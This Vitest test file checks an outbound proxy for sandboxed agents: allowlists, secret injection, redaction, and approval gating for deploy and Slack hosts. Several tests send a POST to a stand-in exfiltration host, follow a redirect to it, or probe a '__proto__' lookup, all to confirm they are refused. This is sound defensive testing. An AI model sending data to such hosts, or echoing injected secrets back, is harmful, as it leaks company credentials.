import { describe, expect, it, vi } from "vitest";

import { handleOutbound, type OutboundDeps } from "../src/outbound.js";
import { OutboundPolicy } from "../src/policy.js";
import { companyScope, type CompanyScope } from "../src/scope.js";
import { DevSecretResolver, SecretUnavailable } from "../src/secrets.js";

const A = companyScope("org_a", "cmp_1");
const B = companyScope("org_b", "cmp_1");
const SECRET_A = "sample-github-token-company-a";
const SECRET_B = "sample-github-token-company-b";
const secrets = new DevSecretResolver(
  JSON.stringify({ "org_a/cmp_1": { github: SECRET_A }, "org_b/cmp_1": { github: SECRET_B } }),
);

const githubPolicy = OutboundPolicy.parse({
  hosts: [
    { host: "api.github.com", inject: [{ header: "authorization", secret: "github", prefix: "Bearer " }] },
    { host: "registry.npmjs.org" },
  ],
});

// An upstream that echoes the request's headers back, as httpbin.org/headers does.
function echoUpstream() {
  const seen: Request[] = [];
  const upstream = vi.fn(async (request: Request) => {
    seen.push(request);
    const headers = Object.fromEntries(request.headers);
    return new Response(JSON.stringify({ url: request.url, headers }), {
      headers: { "content-type": "application/json", "x-echo-auth": request.headers.get("authorization") ?? "" },
    });
  });
  return { seen, upstream };
}

function deps(overrides: Partial<OutboundDeps> = {}) {
  const logs: unknown[] = [];
  const { seen, upstream } = echoUpstream();
  const d: OutboundDeps = {
    policy: async () => githubPolicy,
    approved: async () => false,
    secrets,
    upstream,
    log: (entry) => logs.push(entry),
    ...overrides,
  };
  return { d, logs, seen, upstream: d.upstream };
}

const send = (scope: CompanyScope, url: string, d: OutboundDeps, init?: RequestInit) =>
  handleOutbound(new Request(url, init), scope, d);

describe("outbound handler", () => {
  it("asks for an uncompressed, whole response when it adds a secret", async () => {
    const { d, seen } = deps();
    await send(A, "https://api.github.com/user", d, {
      headers: { "accept-encoding": "deflate, zstd", range: "bytes=0-9" },
    });
    expect(seen[0]?.headers.get("accept-encoding")).toBe("identity");
    expect(seen[0]?.headers.get("range")).toBeNull();
  });

  it("refuses an encoded echo it cannot scan, so the secret never reaches the sandbox", async () => {
    for (const encoding of ["deflate", "zstd", "compress", "x-custom"]) {
      const upstream = vi.fn(
        async (request: Request) =>
          new Response(`echo ${request.headers.get("authorization")}`, { headers: { "content-encoding": encoding } }),
      );
      const { d } = deps({ upstream });
      const response = await send(A, "https://api.github.com/user", d);
      expect(response.status, encoding).toBe(502);
      expect(await response.text(), encoding).not.toContain(SECRET_A);
    }
  });

  it("leaves encodings alone when it adds no secret", async () => {
    const upstream = vi.fn(async () => new Response("packed", { headers: { "content-encoding": "zstd" } }));
    const { d } = deps({ upstream });
    const response = await send(A, "https://registry.npmjs.org/zod", d, { headers: { "accept-encoding": "zstd" } });
    expect(response.status).toBe(200);
  });

  it("refuses a host that is not on the company's allowlist", async () => {
    const { d, upstream, logs } = deps();
    const response = await send(A, "https://exfil.example.net/upload", d, { method: "POST", body: "data" });
    expect(response.status).toBe(403);
    expect(upstream).not.toHaveBeenCalled();
    expect(logs).toContainEqual(expect.objectContaining({ event: "outbound.denied", reason: "not_allowed" }));
  });

  it("refuses everything when the company has no policy", async () => {
    const { d, upstream } = deps({ policy: async () => ({ hosts: [] }) });
    expect((await send(A, "https://registry.npmjs.org/zod", d)).status).toBe(403);
    expect(upstream).not.toHaveBeenCalled();
  });

  it("fails closed when the policy cannot be read", async () => {
    const { d, upstream } = deps({ policy: () => Promise.reject(new Error("storage down")) });
    expect((await send(A, "https://registry.npmjs.org/zod", d)).status).toBe(403);
    expect(upstream).not.toHaveBeenCalled();
  });

  it("passes an allowed host through without credentials", async () => {
    const { d, seen } = deps();
    const response = await send(A, "https://registry.npmjs.org/zod", d, { headers: { accept: "application/json" } });
    expect(response.status).toBe(200);
    expect(seen[0]?.headers.get("authorization")).toBeNull();
    expect(seen[0]?.headers.get("accept")).toBe("application/json");
  });

  it("adds the company's secret to an allowed host, replacing any the sandbox sent", async () => {
    const { d, seen } = deps();
    const response = await send(A, "https://api.github.com/repos/o/r", d, {
      headers: { authorization: "Bearer guessed-by-the-agent" },
    });
    expect(response.status).toBe(200);
    expect(seen).toHaveLength(1);
    expect(seen[0]?.headers.get("authorization")).toBe(`Bearer ${SECRET_A}`);
    expect(seen[0]?.redirect).toBe("manual");
  });

  it("never returns the secret to the sandbox or writes it to a log", async () => {
    const { d, logs } = deps();
    const response = await send(A, "https://api.github.com/user", d);
    const body = await response.text();
    expect(body).toContain("[redacted]");
    expect(body).not.toContain(SECRET_A);
    expect(response.headers.get("x-echo-auth")).toBe("Bearer [redacted]");
    expect(JSON.stringify(logs)).not.toContain(SECRET_A);
    expect(JSON.stringify(logs)).not.toContain("/user");
  });

  it("adds secrets over https only", async () => {
    const { d, upstream } = deps();
    expect((await send(A, "http://api.github.com/user", d)).status).toBe(403);
    expect(upstream).not.toHaveBeenCalled();
  });

  it("refuses ports other than 80 and 443", async () => {
    const { d, upstream } = deps();
    expect((await send(A, "https://registry.npmjs.org:8443/zod", d)).status).toBe(403);
    expect((await send(A, "http://registry.npmjs.org:22/", d)).status).toBe(403);
    expect(upstream).not.toHaveBeenCalled();
  });

  it("does not forward the request when the secret is missing", async () => {
    const missing = { resolve: () => Promise.reject(new SecretUnavailable("github")) };
    const { d, upstream } = deps({ secrets: missing });
    expect((await send(A, "https://api.github.com/user", d)).status).toBe(502);
    expect(upstream).not.toHaveBeenCalled();
  });

  it("hands a redirect back to the sandbox instead of following it", async () => {
    const redirect = vi.fn(
      async () => new Response(null, { status: 302, headers: { location: "https://exfil.example.net/" } }),
    );
    const { d } = deps({ upstream: redirect });
    const response = await send(A, "https://api.github.com/user", d);
    expect(response.status).toBe(302);
    expect(redirect).toHaveBeenCalledTimes(1);
  });

  it("resolves secrets only in the requesting company's scope", async () => {
    const resolve = vi.fn((scope: CompanyScope, ref: string) => secrets.resolve(scope, ref));
    const { d, seen } = deps({ secrets: { resolve } });
    await send(B, "https://api.github.com/user", d);
    expect(resolve).toHaveBeenCalledWith(B, "github");
    expect(resolve).not.toHaveBeenCalledWith(A, expect.anything());
    expect(seen[0]?.headers.get("authorization")).toBe(`Bearer ${SECRET_B}`);
  });
});

describe("hosts held for an approval", () => {
  const deployPolicy = OutboundPolicy.parse({
    hosts: [
      {
        host: "api.cloudflare.com",
        approval: "deploy",
        inject: [{ header: "authorization", secret: "cloudflare", prefix: "Bearer " }],
      },
      { host: "hooks.slack.com", approval: "customer_send" },
      { host: "registry.npmjs.org" },
    ],
  });
  const resolve = vi.fn(async () => "sample-cloudflare-token");

  it("refuse the request until an FDE approved the action, before any secret is resolved", async () => {
    resolve.mockClear();
    const { d, upstream, logs } = deps({ policy: async () => deployPolicy, secrets: { resolve } });
    for (const url of ["https://api.cloudflare.com/client/v4/accounts", "https://hooks.slack.com/services/x"]) {
      const response = await send(A, url, d, { method: "POST", body: "{}" });
      expect(response.status, url).toBe(403);
    }
    expect(upstream).not.toHaveBeenCalled();
    expect(resolve).not.toHaveBeenCalled();
    expect(logs).toContainEqual(expect.objectContaining({ event: "outbound.denied", reason: "approval_required" }));
    // Hosts without an approval are unaffected.
    expect((await send(A, "https://registry.npmjs.org/zod", d)).status).toBe(200);
  });

  it("pass the request once the action is approved, for that action only", async () => {
    const approved = vi.fn(async (action: string) => action === "deploy");
    const { d, upstream } = deps({ policy: async () => deployPolicy, secrets: { resolve }, approved });
    expect((await send(A, "https://api.cloudflare.com/client/v4/accounts", d)).status).toBe(200);
    expect(approved).toHaveBeenCalledWith("deploy");
    expect((await send(A, "https://hooks.slack.com/services/x", d, { method: "POST", body: "{}" })).status).toBe(403);
    expect(upstream).toHaveBeenCalledTimes(1);
  });

  it("fail closed when the approval cannot be checked", async () => {
    const broken = [
      () => Promise.reject(new Error("storage down")),
      () => {
        throw new Error("rpc failed");
      },
    ];
    for (const approved of broken) {
      const { d, upstream } = deps({ policy: async () => deployPolicy, approved });
      expect((await send(A, "https://hooks.slack.com/services/x", d)).status).toBe(403);
      expect(upstream).not.toHaveBeenCalled();
    }
  });
});

describe("dev secret resolver", () => {
  it("resolves a reference only inside the company that owns it", async () => {
    await expect(secrets.resolve(A, "github")).resolves.toBe(SECRET_A);
    await expect(secrets.resolve(companyScope("org_a", "cmp_2"), "github")).rejects.toBeInstanceOf(SecretUnavailable);
    await expect(secrets.resolve(A, "__proto__")).rejects.toBeInstanceOf(SecretUnavailable);
  });

  it("resolves nothing from malformed config, without logging it", async () => {
    const error = vi.spyOn(console, "error").mockImplementation(() => {});
    const resolver = new DevSecretResolver(`{"org_a/cmp_1": {"github": ${JSON.stringify(SECRET_A)}`);
    await expect(resolver.resolve(A, "github")).rejects.toBeInstanceOf(SecretUnavailable);
    expect(JSON.stringify(error.mock.calls)).not.toContain(SECRET_A);
    error.mockRestore();
  });
});
